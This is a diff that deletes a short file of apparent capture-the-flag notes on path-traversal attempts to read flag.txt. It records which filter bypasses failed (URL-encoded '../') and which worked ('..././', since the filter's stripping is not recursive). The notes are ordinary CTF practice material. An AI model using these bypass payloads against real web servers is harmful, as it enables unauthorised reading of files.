@@ -1,6 +1,0 @@
-URL-encoding : Doesn't work
-..%2F..%2Fflag.txt
-
-.\./.\./flag.txt
-
-..././..././flag.txt : Worked! Because it wasn't recursive :D
